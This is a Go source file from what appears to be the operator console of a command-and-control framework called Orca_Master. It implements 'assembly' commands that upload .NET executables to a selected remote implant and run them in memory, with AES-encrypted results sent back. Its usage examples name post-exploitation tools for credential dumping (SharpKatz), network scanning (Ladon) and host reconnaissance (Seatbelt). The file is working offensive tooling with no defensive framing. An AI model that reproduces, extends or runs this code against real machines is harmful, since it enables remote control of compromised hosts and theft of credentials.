package controller

import (
	"Orca_Master/cli/cmdopt/assemblyopt"
	"Orca_Master/cli/cmdopt/fileopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"encoding/json"
	"fmt"
	"github.com/desertbit/grumble"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// 程序集命令
var assemblyCmd = &grumble.Command{
	Name:  "assembly",
	Help:  "manage the CLR and execute .NET assemblies",
	Usage: "assembly list|load|invoke|clear [-h | --help]",
}

// 加载程序集命令
var assemblyLoadCmd = &grumble.Command{
	Name: "load",
	Help: "load .NET assemblies to remote host",
	Args: func(a *grumble.Args) {
		a.String("file", ".NET program path")
	},
	Usage: "assembly load [-h | --help] <file>\n" +
		"  Notes: The path of the file can be an absolute path or a directory under a third-party.\n" +
		"  eg: \n   assembly load Ladon\n   assembly load \"C:\\CSharp\\SharpKatz.exe\"",
	Completer: func(prefix string, args []string) []string {
		var assemblyNames []string
		yamlFile, _ := filepath.Abs("3rd_party/windows/csharp/assembly.yaml")
		assemblyYaml := assemblyopt.ReadYamlFile(yamlFile)
		for _, assemblyStruct := range assemblyYaml.AssemblyStructs {
			assemblyNames = append(assemblyNames, assemblyStruct.Name)
		}
		if len(args) == 0 {
			return filterStringWithPrefix(assemblyNames, prefix)
		}
		return []string{}
	},
	Run: func(c *grumble.Context) error {
		if SelectVer[len(SelectVer)-3:] == "386" {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "this feature does not support x86 architecture")
			return nil
		}
		// 检测输入的.net程序路径
		var exePath string
		file := c.Args.String("file")
		file = strings.TrimSpace(file)
		if file[len(file)-4:len(file)] != ".exe" {
			file = file + ".exe"
		}
		if filepath.IsAbs(file) {
			exePath = file
		} else {
			exePath, _ = filepath.Abs("3rd_party/windows/csharp/" + file)
		}

		if !fileopt.IsLocalFileLegal(exePath) {
			return nil
		}
		// 发送程序集元信息
		data := assemblyopt.GetAssemblyMetaInfo(exePath)
		retData := assemblyopt.SendAssemblyMetaMsg(SelectClientId, data)
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "assembly load failed")
			return nil
		}
		// 分片发送文件
		assemblyopt.SendFileData(SelectClientId, exePath)
		// 接收消息，显示是否发送成功
		select {
		case msg := <-common.DefaultMsgChan:
			outputMsg, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(outputMsg)

			time.Sleep(100 * time.Millisecond)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "request timed out")
			return nil
		}
		return nil
	},
}

// 列出程序集命令
var assemblyListCmd = &grumble.Command{
	Name:    "list",
	Aliases: []string{"ls"},
	Help:    "list .NET assemblies",
	Usage:   "assembly list [-h | --help]",
	Run: func(c *grumble.Context) error {
		if SelectId == -1 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please select the id first")
			return nil
		}
		// 发送消息
		msg := "assemblyList"
		data := ""
		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, msg, data, "")
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "assembly list failed")
			return nil
		}
		// 接收消息，显示已加载的程序集
		select {
		case msg := <-common.AssemblyListMsgChan:
			// 打印程序集列表
			assemblyStructs := assemblyopt.SettleLoadedAssembly(msg)
			assemblyopt.PrintTable(assemblyStructs)
			time.Sleep(100 * time.Millisecond)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		return nil
	},
}

var assemblyInvokeCmd = &grumble.Command{
	Name: "invoke",
	Help: "executes a previously loaded assembly",
	Usage: "assembly invoke [-h | --help] [-s | --save] <param>\n" +
		"  Notes: The first arg of param must be a loaded assembly.\n" +
		"  eg: \n   assembly invoke -s Ladon 192.168.1.0/24 OnlinePC",

	Flags: func(f *grumble.Flags) {
		f.Bool("s", "save", false, "save the output result to the local")
	},
	Args: func(a *grumble.Args) {
		a.StringList("param", "assembly parameters")
	},
	Completer: func(prefix string, args []string) []string {
		var loadedAssemblyNames []string
		msg := "assemblyList"
		data := ""
		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, msg, data, "")
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "assembly list failed")
			return nil
		}
		select {
		case msg := <-common.AssemblyListMsgChan:
			assemblyStructs := assemblyopt.SettleLoadedAssembly(msg)
			for _, assemblyStruct := range assemblyStructs {
				if assemblyStruct.Loaded == "loaded" {
					loadedAssemblyNames = append(loadedAssemblyNames, assemblyStruct.Name)
				}
			}
		case <-time.After(5 * time.Second):
			return nil
		}

		if len(args) == 0 {
			return filterStringWithPrefix(loadedAssemblyNames, prefix)
		}
		return []string{}
	},
	Run: func(c *grumble.Context) error {
		if SelectId == -1 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please select the id first")
			return nil
		}
		saveFlag := c.Flags.Bool("save")
		args := c.Args.StringList("param")
		if len(args) == 0 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "Please enter the parameters of the assembly, eg: Seatbelt.exe -group=system")
			return nil
		}
		path := args[0]
		path = strings.Trim(path, " ")
		if path[len(path)-4:len(path)] != ".exe" {
			path = path + ".exe"
		}
		args[0] = path
		msg := "assemblyInvoke"
		jsonData, _ := json.Marshal(args)
		data, _ := crypto.Encrypt(jsonData, []byte(config.AesKey))
		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, msg, data, "")
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "assembly list failed")
			return nil
		}

		colorcode.PrintMessage(colorcode.SIGN_NOTICE, colorcode.COLOR_SHINY+"assembly is being invoked..."+colorcode.END)
		select {
		case msg := <-common.AssemblyInvokeMsgChan:
			_, _, data = common.SettleRetData(msg)
			fmt.Println(data)
		case <-time.After(10 * time.Minute):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		// 保存输出结果
		savePath := "tmp/assembly"
		if saveFlag {
			// 保存截图路径
			if !fileopt.IsDir(savePath) {
				err := os.Mkdir(savePath, 0666)
				if err != nil {
					return fmt.Errorf("%s", err)
				}
			}
			timeStr := strconv.FormatInt(time.Now().Unix(), 10)
			pwd, _ := os.Getwd()
			temp := savePath + "/" + timeStr + ".txt"
			saveFile, err := filepath.Abs(filepath.Join(pwd, temp))
			if err != nil {
				return fmt.Errorf(err.Error())
			}
			pSaveFile, _ := os.OpenFile(saveFile, os.O_CREATE|os.O_RDWR, 0600)
			defer pSaveFile.Close()
			pSaveFile.Write([]byte(data))
			colorcode.PrintMessage(colorcode.SIGN_SUCCESS, "The output has been saved to\n\t"+saveFile)
			time.Sleep(100 * time.Millisecond)
		}
		return nil
	},
}

// 列出程序集命令
var assemblyClearCmd = &grumble.Command{
	Name:  "clear",
	Help:  "clear loaded .NET assemblies",
	Usage: "assembly clear [-h | --help]",
	Run: func(c *grumble.Context) error {
		if SelectId == -1 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please select the id first")
			return nil
		}
		// 发送消息
		msg := "assemblyClear"
		data := ""
		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, msg, data, "")
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "assembly clear failed")
			return nil
		}
		colorcode.PrintMessage(colorcode.SIGN_SUCCESS, "assembly clear success")
		time.Sleep(100 * time.Millisecond)
		return nil
	},
}
